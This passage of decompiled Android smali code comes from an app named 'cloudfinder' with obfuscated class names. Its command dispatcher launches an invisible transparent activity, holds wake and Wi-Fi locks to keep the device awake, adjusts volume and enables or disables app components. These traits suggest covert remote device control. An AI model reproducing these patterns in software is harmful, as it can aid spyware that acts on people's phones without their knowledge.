    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v4, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :goto_2
    :try_start_7
    new-instance v1, Landroid/content/Intent;

    iget-object v7, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-class v8, Lcom/lite/cloudfinder/activity/TransparentActivity;

    invoke-direct {v1, v7, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v7, 0x34000000

    invoke-virtual {v1, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v7, "autoFinish"

    invoke-virtual {v1, v7, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    iget-object v7, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {v7, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const-string v1, "wakeup: TransparentActivity launched"

    invoke-static {v4, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    goto :goto_3

    :catch_3
    move-exception v1

    :try_start_8
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_3
    iget-object v0, p0, Lڜٟٱڀ/أ;->أ:Landroid/os/PowerManager$WakeLock;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-nez v0, :cond_2

    :cond_1
    const-string v0, "BPkg:KeepAwake"

    invoke-virtual {v5, v6, v0}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    iput-object v0, p0, Lڜٟٱڀ/أ;->أ:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0, v2, v3}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    :cond_2
    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "wifi"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/wifi/WifiManager;

    if-eqz v0, :cond_4

    iget-object v1, p0, Lڜٟٱڀ/أ;->ؤ:Landroid/net/wifi/WifiManager$WifiLock;

    if-eqz v1, :cond_3

    invoke-virtual {v1}, Landroid/net/wifi/WifiManager$WifiLock;->isHeld()Z

    move-result v1

    if-nez v1, :cond_4

    :cond_3
    const-string v1, "BPkg:AwakeWifi"

    const/4 v2, 0x3

    invoke-virtual {v0, v2, v1}, Landroid/net/wifi/WifiManager;->createWifiLock(ILjava/lang/String;)Landroid/net/wifi/WifiManager$WifiLock;

    move-result-object v0

    iput-object v0, p0, Lڜٟٱڀ/أ;->ؤ:Landroid/net/wifi/WifiManager$WifiLock;

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager$WifiLock;->acquire()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4

    goto :goto_4

    :catch_4
    move-exception v0

    const-string v1, "wakeup error"

    invoke-static {v4, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_4
    :goto_4
    return-void
.end method

.method public final ڟ(Lorg/json/JSONObject;)V
    .locals 3

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lڜٟٱڀ/ء;

    const/4 v2, 0x5

    invoke-direct {v1, p0, p1, v2}, Lڜٟٱڀ/ء;-><init>(Lڜٟٱڀ/أ;Lorg/json/JSONObject;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public final ڢ(I)V
    .locals 4

    :try_start_0
    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "audio"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    if-eqz v0, :cond_1

    const/16 v1, 0x18

    const/4 v2, 0x3

    const/4 v3, 0x1

    if-ne p1, v1, :cond_0

    invoke-virtual {v0, v2, v3, v3}, Landroid/media/AudioManager;->adjustStreamVolume(III)V

    goto :goto_0

    :cond_0
    const/16 v1, 0x19

    if-ne p1, v1, :cond_1

    const/4 p1, -0x1

    invoke-virtual {v0, v2, p1, v3}, Landroid/media/AudioManager;->adjustStreamVolume(III)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    const-string v0, "CommandDispatcher"

    const-string v1, "injectKeyEvent error"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_1
    :goto_0
    return-void
.end method

.method public final ڥ(Ljava/lang/String;Z)V
    .locals 6

    const-string v0, "CommandDispatcher"

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v2, "Component "

    :try_start_0
    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    new-instance v4, Landroid/content/ComponentName;

    invoke-direct {v4, v1, p1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v1, 0x1

    if-eqz p2, :cond_0

    move v5, v1

    goto :goto_0

    :cond_0
    const/4 v5, 0x2

    :goto_0
    invoke-virtual {v3, v4, v5, v1}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, " enabled="

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    const-string p2, "setComponentEnabled error"

    invoke-static {v0, p2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_1
    return-void
.end method
